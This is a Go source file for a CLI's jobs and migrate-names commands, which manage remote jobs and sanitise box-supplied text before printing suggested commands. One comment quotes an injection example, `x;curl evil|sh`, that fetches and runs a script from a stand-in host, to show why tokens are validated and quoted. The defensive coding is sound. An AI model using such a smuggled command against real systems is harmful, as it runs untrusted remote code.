package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/signal"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/valve-tech/jumpgate/internal/api"
	"github.com/valve-tech/jumpgate/internal/apiclient"
	"github.com/valve-tech/jumpgate/internal/catalog"
	"github.com/valve-tech/jumpgate/internal/executor"
	"github.com/valve-tech/jumpgate/internal/jobs"
	"github.com/valve-tech/jumpgate/internal/termsafe"
)

const jobsUsage = "usage: jumpgate jobs [HOST] | jobs show HOST JOB | jobs decide HOST JOB DECISION OPTION | jobs adopt HOST JOB | jobs output JOB"

func cmdJobs(args []string) int {
	switch {
	case len(args) <= 1 && (len(args) == 0 || !isJobsVerb(args[0])):
		host := ""
		if len(args) == 1 {
			host = args[0]
		}
		return withClient(func(ctx context.Context, c *apiclient.Client) error {
			in, err := c.Jobs(ctx)
			if err == nil {
				printInbox(os.Stdout, in, host, time.Now())
			}
			return err
		})
	case args[0] == "show" && len(args) == 3:
		return withClient(func(ctx context.Context, c *apiclient.Client) error {
			d, err := c.Job(ctx, args[1], args[2])
			if err == nil {
				printJobDetail(os.Stdout, d)
			}
			return err
		})
	case args[0] == "decide" && len(args) == 5:
		return withClient(func(ctx context.Context, c *apiclient.Client) error {
			v, err := c.Decide(ctx, args[1], args[2], api.JobDecision{Decision: args[3], Option: args[4]})
			if err == nil {
				fmt.Printf("%s %s: %s\n", safe(v.Target), safe(v.ID), safe(v.State))
			}
			return err
		})
	case args[0] == "adopt" && len(args) == 3:
		return withClient(func(ctx context.Context, c *apiclient.Client) error {
			v, err := c.Adopt(ctx, args[1], args[2])
			if err == nil {
				fmt.Printf("%s %s: this controller drives it now (%s)\n", safe(v.Target), safe(v.ID), safe(v.State))
			}
			return err
		})
	case args[0] == "output" && len(args) == 2:
		return withClient(func(ctx context.Context, c *apiclient.Client) error {
			ctx, stop := signal.NotifyContext(ctx, os.Interrupt)
			defer stop()
			host, err := jobHost(ctx, c, args[1])
			if err != nil {
				return err
			}
			return followOutput(os.Stdout, c.WatchJobOutput(ctx, host, args[1]))
		})
	}
	return usage(jobsUsage)
}

func isJobsVerb(s string) bool { return s == "show" || s == "decide" || s == "adopt" || s == "output" }

// safe is a one-line field from the box, cleaned for the terminal: a box, or
// a job's own output, must not be able to move the cursor, retitle the
// window or write the clipboard of the operator who reads it.
func safe(s string) string { return termsafe.Line(s) }

// A token a box supplied may enter a command line the operator is invited to
// paste only if it has the shape the box's own rules give it. Control-byte
// stripping is not enough: `x;curl evil|sh` has no control bytes.
type tokenKind int

const (
	hostToken   tokenKind = iota // a target name; the rule the TUI's host form enforces
	jobToken                     // a job id
	choiceToken                  // a question or option id
)

func validToken(k tokenKind, s string) bool {
	if k == jobToken {
		return jobs.ValidID(s)
	}
	// Target names and question/option ids share the step-id shape.
	return jobs.ValidStepID(s)
}

// suggestCommand is the one place a copyable `jumpgate …` line is built. It
// returns ok=false, and no command, unless every box-supplied token matches
// its pattern; each token is also shell-quoted, so a rule that is loosened
// later still cannot turn a token into shell syntax.
func suggestCommand(fixed []string, tokens ...struct {
	kind tokenKind
	text string
}) (string, bool) {
	argv := append([]string{"jumpgate"}, fixed...)
	for _, t := range tokens {
		if !validToken(t.kind, t.text) {
			return "", false
		}
		argv = append(argv, t.text)
	}
	// QuoteArgv leaves argv[0] bare and single-quotes the rest.
	return executor.QuoteArgv(argv), true
}

type tok = struct {
	kind tokenKind
	text string
}

// jobHost finds the box that runs job id, so `jobs output` takes only the id
// `jumpgate jobs` prints (ruling P13). Ids are 64 random bits; an id on two
// boxes is refused rather than guessed.
func jobHost(ctx context.Context, c *apiclient.Client, id string) (string, error) {
	in, err := c.Jobs(ctx)
	if err != nil {
		return "", err
	}
	var hosts []string
	for _, j := range in.Jobs {
		if j.ID == id {
			hosts = append(hosts, j.Target)
		}
	}
	switch len(hosts) {
	case 0:
		return "", fmt.Errorf("no box that answered has a job %s (`jumpgate jobs` lists them)", safe(id))
	case 1:
		return hosts[0], nil
	}
	return "", fmt.Errorf("job %s is on more than one box (%s); run `jumpgate jobs show` with the box you mean and this id", safe(id), safe(strings.Join(hosts, ", ")))
}

// followOutput prints a job's journal as it arrives, until the stream ends
// (Ctrl-C) or the server refuses the job. Other stream errors are the
// connection's, which watch retries by itself.
func followOutput(w io.Writer, ch <-chan apiclient.Update[[]api.JobOutputLine]) error {
	for u := range ch {
		var e *api.Error
		if errors.As(u.Err, &e) {
			return e
		}
		if !u.Has {
			continue
		}
		for _, l := range u.Value {
			fmt.Fprintf(w, "%s %s %s\n", l.At.Format(time.RFC3339), safe(l.Unit), outputLine(l.Line))
		}
	}
	return nil
}

// outputLine cleans one line a step wrote. Unlike a title it keeps tabs,
// which columnar tool output depends on; everything else that could drive
// the terminal goes, and a stray newline cannot forge a second journal line.
func outputLine(s string) string {
	return strings.ReplaceAll(termsafe.Text(s), "\n", " ")
}

// cmdMigrateNames starts node.migrate-names. It stops the node's services
// for the length of the job, so it wants --yes, as reset-replay does; a
// session with no way to type it is refused the same way.
func cmdMigrateNames(args []string) int {
	host, yes, ok := "", false, true
	for _, a := range args {
		switch {
		case a == "--yes":
			yes = true
		case host == "" && !strings.HasPrefix(a, "-"):
			host = a
		default:
			ok = false
		}
	}
	if !ok || host == "" || !yes {
		return usage("usage: jumpgate migrate-names HOST --yes  (stops the node services on HOST while it renames the " +
			catalog.LegacyNames.Prefix + " account, units and data root to " + catalog.CurrentNames.Prefix + ")")
	}
	return withClient(func(ctx context.Context, c *apiclient.Client) error {
		v, err := c.MigrateNames(ctx, host)
		if err == nil {
			follow := "the jobs inbox (5 in jumpgate)"
			if cmd, ok := suggestCommand([]string{"jobs"}, tok{hostToken, v.Target}); ok {
				follow = "`" + cmd + "` or " + follow
			}
			fmt.Printf("job %s started on %s; follow it with %s\n", safe(v.ID), safe(v.Target), follow)
		}
		return err
	})
}

// withClient connects, runs f, and maps an API error to the CLI's exit codes.
// The error's text came from a box, so it is cleaned before it is printed.
func withClient(f func(ctx context.Context, c *apiclient.Client) error) int {
	ctx := context.Background()
	c, err := connect(ctx)
	if err != nil {
		return failed("%s", safe(err.Error()))
	}
	apiclient.WarnSkew(os.Stderr, c)
	err = f(ctx, c)
	var e *api.Error
	if errors.As(err, &e) {
		clean := *e
		clean.Message, clean.Hint, clean.Reason = safe(e.Message), safe(e.Hint), safe(e.Reason)
		return reportServerErrorFrom(os.Stderr, "jobs", c.Info(), clean)
	}
	if err != nil {
		return failed("%s", safe(err.Error()))
	}
	return 0
}

func printInbox(w io.Writer, in api.JobsInbox, host string, now time.Time) {
	tw := tabwriter.NewWriter(w, 0, 4, 2, ' ', 0)
	fmt.Fprintln(tw, "HOST\tJOB\tKIND\tSTATE\tSTEP\tLEASE")
	for _, j := range in.Jobs {
		if host != "" && j.Target != host {
			continue
		}
		lease := "nobody"
		switch {
		case j.Lease.Mine:
			lease = "this controller"
		case j.Lease.Fresh:
			lease = j.Lease.Owner
		case j.Lease.HeartbeatAt != nil:
			lease = fmt.Sprintf("%s, silent %s (adoptable)", j.Lease.Owner, ago(now.Sub(*j.Lease.HeartbeatAt)))
		}
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%d/%d\t%s\n", safe(j.Target), safe(j.ID), safe(j.Kind), safe(j.State), min(j.Step+1, len(j.Steps)), len(j.Steps), safe(lease))
		if q := j.Question; q != nil {
			fmt.Fprintf(tw, "\t? %s\n", safe(q.Prompt))
			tokens := []tok{{hostToken, j.Target}, {jobToken, j.ID}, {choiceToken, q.ID}}
			ids := make([]string, len(q.Options))
			for i, o := range q.Options {
				tokens, ids[i] = append(tokens, tok{choiceToken, o.ID}), o.ID
			}
			if cmd, ok := suggestCommand([]string{"jobs", "decide"}, tokens[:3]...); ok && validAll(tokens[3:]) {
				// The options are alternatives, listed beside a placeholder: a `|` in
				// a line meant for pasting would be a shell pipe.
				fmt.Fprintf(tw, "\t  %s OPTION   (OPTION is one of: %s)\n", cmd, strings.Join(ids, ", "))
			} else {
				fmt.Fprintf(tw, "\t  this question cannot be shown as a command; decide it in the jobs inbox (5 in jumpgate)\n")
			}
		}
	}
	tw.Flush()
	for _, e := range in.Errors {
		if host == "" || e.Target == host {
			fmt.Fprintf(w, "%s: %s\n", safe(e.Target), safe(e.Error.Message))
		}
	}
}

func validAll(ts []tok) bool {
	for _, t := range ts {
		if !validToken(t.kind, t.text) {
			return false
		}
	}
	return true
}

// ago is a duration the way a person reads an age: 45s, 2m, 3h, 2d.
func ago(d time.Duration) string {
	switch {
	case d < time.Minute:
		return fmt.Sprintf("%ds", int(d/time.Second))
	case d < time.Hour:
		return fmt.Sprintf("%dm", int(d/time.Minute))
	case d < 48*time.Hour:
		return fmt.Sprintf("%dh", int(d/time.Hour))
	}
	return fmt.Sprintf("%dd", int(d/(24*time.Hour)))
}

func printJobDetail(w io.Writer, d api.JobDetail) {
	j := d.Job
	fmt.Fprintf(w, "%s on %s: %s (%s), step %d/%d\n", safe(j.ID), safe(j.Target), safe(j.Title), safe(j.State), min(j.Step+1, len(j.Steps)), len(j.Steps))
	for _, s := range j.Steps {
		fmt.Fprintf(w, "  %-8s %s\n", safe(s.State), safe(s.Title))
	}
	fmt.Fprintln(w, "signed log (verified against the box's agent key):")
	for _, l := range d.Log {
		fmt.Fprintf(w, "  %3d %s %s\n", l.Index, l.At.Format(time.RFC3339), safe(l.Text))
	}
}
